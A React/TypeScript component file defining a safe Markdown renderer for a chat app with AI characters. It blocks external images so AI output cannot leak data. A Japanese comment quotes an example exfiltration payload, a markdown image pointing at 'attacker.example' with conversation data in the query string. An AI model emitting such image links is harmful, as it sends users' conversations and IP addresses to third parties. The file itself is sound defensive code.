import type { ComponentPropsWithoutRef } from 'react';
import ReactMarkdown, {
    defaultUrlTransform,
    type Components,
    type UrlTransform,
} from 'react-markdown';
import { isAllowedMarkdownImageSource } from '@/lib/imageSourcePolicy';
import StoredImage from './StoredImage';

/** 外部画像の読み込みを止めたときに出す文言。 */
const BLOCKED_IMAGE_LABEL = '外部画像は表示されません';

/**
 * Markdown中の画像。外部URLをそのまま描画すると、AIや取り込んだキャラクターの
 * 出力に仕込まれた `![](https://attacker.example/?data=...)` で会話内容や
 * IPアドレスが外部へ送られる。アプリ内で完結する参照だけを表示する。
 */
function SafeMarkdownImage({ src, alt, title }: ComponentPropsWithoutRef<'img'>) {
    if (typeof src !== 'string' || !isAllowedMarkdownImageSource(src)) {
        // URLはtitleに残すが、長すぎる値で表示が崩れないよう切り詰める。
        const blockedTitle = typeof src === 'string'
            ? `${BLOCKED_IMAGE_LABEL}: ${src.length > 200 ? `${src.slice(0, 200)}…` : src}`
            : BLOCKED_IMAGE_LABEL;
        return (
            <span
                role="img"
                aria-label={BLOCKED_IMAGE_LABEL}
                title={blockedTitle}
                style={{
                    display: 'inline-block',
                    padding: '0.1rem 0.4rem',
                    border: '1px dashed var(--border-color)',
                    borderRadius: '0.375rem',
                    color: 'var(--text-muted)',
                    fontSize: '0.85em',
                }}
            >
                {BLOCKED_IMAGE_LABEL}
            </span>
        );
    }
    // asset: 参照はStoredImageが /api/assets/<id> へ解決する。
    return <StoredImage src={src} alt={alt ?? ''} title={title} />;
}

const MARKDOWN_COMPONENTS: Components = { img: SafeMarkdownImage };

/**
 * react-markdownの既定のサニタイザは `data:` / `blob:` / `asset:` を空文字にする。
 * 許可済みの画像参照だけはそのまま通し、それ以外（リンク等）は既定の判定に任せる。
 */
const markdownUrlTransform: UrlTransform = (url, key, node) => {
    if (key === 'src' && node.tagName === 'img' && isAllowedMarkdownImageSource(url)) {
        return url;
    }
    return defaultUrlTransform(url);
};

/**
 * 外部画像を描画しない設定をまとめたMarkdown。
 * AIやキャラクター由来の本文を表示するときは、react-markdownを直接使わずにこれを使う。
 */
export default function SafeMarkdown({ children }: { children: string }) {
    return (
        <ReactMarkdown components={MARKDOWN_COMPONENTS} urlTransform={markdownUrlTransform}>
            {children}
        </ReactMarkdown>
    );
}
